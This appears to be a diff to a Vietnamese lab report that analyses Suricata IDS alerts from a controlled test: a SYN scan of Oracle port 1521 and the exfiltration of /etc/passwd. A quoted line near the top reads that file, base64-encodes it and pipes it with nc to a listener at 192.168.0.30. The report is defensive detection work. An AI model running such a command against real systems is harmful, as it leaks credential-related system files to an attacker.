@@ -194,26 +194,26 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
     source = /var/log/suricata/eve.json
     sourcetype = suricata
 ```
-1. Thời gian sự kiện:
+1. **Thời gian sự kiện:**
 
 UTC 2026-03-02 16:28:23
 (Timestamp gốc: 2026-03-02T23:28:23.155291+0700)
 
-2. Giao diện mạng:
+2. **Giao diện mạng:**
 
 ens33
 
-3. Hệ thống liên quan
+3. **Hệ thống liên quan**
 
 - Nguồn (attacker): 192.168.0.30:47182
 - Đích (server): 192.168.0.20:1521
 - Giao thức: TCP
 
-4. Loại sự kiện:
+4. **Loại sự kiện:**
 
 Cảnh báo Suricata – Hành vi do thám dịch vụ cơ sở dữ liệu (Service Scanning / Reconnaissance)
 
-5. Mô tả sự kiện:
+5. **Mô tả sự kiện:**
 
 Hệ thống IDS Suricata đã ghi nhận một cảnh báo liên quan đến hành vi quét cổng nhắm vào dịch vụ cơ sở dữ liệu Oracle.
 
@@ -229,7 +229,7 @@ Alert được kích hoạt bởi rule của Emerging Threats:
 
 Rule này được thiết kế để phát hiện các hành vi probing hoặc service enumeration nhắm vào cổng cơ sở dữ liệu nhạy cảm.
 
-6. Thông tin về lưu lượng
+6. **Thông tin về lưu lượng**
 
 - Gói từ attacker đến server: 1 gói / 60 bytes
 - Gói từ server đến attacker: 0 gói / 0 bytes
@@ -239,7 +239,7 @@ Rule này được thiết kế để phát hiện các hành vi probing hoặc 
 
 Phân tích cho thấy chỉ có một gói TCP SYN được gửi đi và không có phản hồi từ phía server. Hành vi này phù hợp với kỹ thuật SYN scan (`nmap -sS`), thường được sử dụng trong giai đoạn trinh sát hệ thống.
 
-7. MITRE ATT&CK Mapping
+7. **MITRE ATT&CK Mapping**
 
 | Trường                         | Giá trị                            |
 | ------------------------------ | ---------------------------------- |
@@ -250,6 +250,14 @@ Phân tích cho thấy chỉ có một gói TCP SYN được gửi đi và khôn
 | Mức độ tin cậy                 | High                               |
 | Mức độ nghiêm trọng (metadata) | Medium                             |
 
+8. **Đánh giá và phân tích**
+
+- Cổng đích 1521 là cổng mặc định của Oracle Database, thường chứa dữ liệu nhạy cảm.
+- Hành vi gửi TCP SYN đơn lẻ đến các cổng dịch vụ phổ biến là đặc trưng của hoạt động reconnaissance.
+- Đây là giai đoạn tiền khai thác (pre-exploitation phase), thường xuất hiện trước brute-force, khai thác lỗ hổng hoặc tấn công leo thang đặc quyền.
+- Do hệ thống đang chạy ở chế độ IDS (không phải IPS), gói tin không bị chặn.
+
+Sự kiện này không cho thấy hành vi khai thác thành công, nhưng xác nhận có hoạt động thăm dò dịch vụ trong mạng nội bộ.
 
 ### Log của hành vi trích xuất thông tin nhạy cảm
 
@@ -326,3 +334,79 @@ Phân tích cho thấy chỉ có một gói TCP SYN được gửi đi và khôn
     source = /var/log/suricata/eve.json
     sourcetype = suricata
 ```
+
+1. **Thời gian sự kiện:**
+
+UTC 2026-03-02 16:38:11
+(Timestamp gốc: 2026-03-02T23:38:11.137019+0700)
+
+2. **Giao diện mạng:**
+
+ens33
+
+3. **Hệ thống liên quan**
+
+- Nguồn (victim/server): 192.168.0.20:57148
+- Đích (attacker/listener): 192.168.0.30:5555
+- Giao thức: TCP
+
+4. **Loại sự kiện:**
+
+Cảnh báo Suricata – Nghi vấn thực thi mã từ xa / truyền dữ liệu mã hóa base64
+
+5. **Mô tả sự kiện:**
+
+Hệ thống IDS Suricata đã ghi nhận một cảnh báo mức độ nghiêm trọng cao liên quan đến hành vi có dấu hiệu thực thi mã từ xa thông qua bash kết hợp với mã hóa base64.
+
+Alert được kích hoạt bởi rule của Emerging Threats:
+
+- Chữ ký phát hiện: ET EXPLOIT bin bash base64 encoded Remote Code Execution 2
+- Signature ID: 2025805
+- Hành động: allowed
+- Danh mục: Attempted User Privilege Gain
+- Mức độ nghiêm trọng: 1 (High)
+- Confidence (metadata): High
+- Deployment context: Datacenter
+
+Rule này thường được kích hoạt khi IDS phát hiện:
+
+- Chuỗi /bin/bash
+- Nội dung được mã hóa base64
+- Mẫu hành vi tương tự payload reverse shell hoặc RCE
+
+6. **Thông tin về lưu lượng**
+
+- Gói từ victim đến attacker: 6 gói / 5373 bytes
+- Gói từ attacker đến victim: 2 gói / 140 bytes
+- Thời gian bắt đầu flow: 2026-03-02T23:38:11.100656+0700
+- Direction: to_server
+- Flow ID: 995265164925303
+Lưu lượng cho thấy:
+
+- 192.168.0.20 chủ động gửi dữ liệu ra ngoài
+- Tổng dung lượng hơn 5 KB
+- Phù hợp với kích thước file /etc/passwd sau khi mã hóa base64
+
+8. **MITRE ATT&CK Mapping**
+
+| Trường                              | Giá trị                                                          |
+| ----------------------------------- | ---------------------------------------------------------------- |
+| Tactic                              | Exfiltration (TA0010)                                            |
+| Technique                           | Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (T1048) |
+| Sub-technique                       | Exfiltration Over Alternative Protocol (T1048.003)               |
+| Mục tiêu                            | Local System File (/etc/passwd)                                  |
+| Mức độ tin cậy                      | High                                                             |
+| Mức độ nghiêm trọng (metadata rule) | Major                                                            |
+
+
+9. **Đánh giá và phân tích**
+
+- Việc sử dụng base64 cho thấy ý định che giấu nội dung truyền đi.
+- Sử dụng nc giúp attacker tạo kênh truyền dữ liệu trực tiếp không mã hóa.
+- Cổng 5555 là cổng tùy ý, thường được sử dụng trong reverse shell hoặc truyền dữ liệu ngoài băng (out-of-band).
+- Tổng lưu lượng lớn hơn 5 KB phù hợp với việc truyền file hệ thống.
+Mặc dù đây là kịch bản kiểm thử có kiểm soát, trong môi trường thực tế hành vi tương tự có thể đại diện cho:
+
+- Data exfiltration sau khi compromise
+- Reverse shell staging
+- Lateral movement preparation
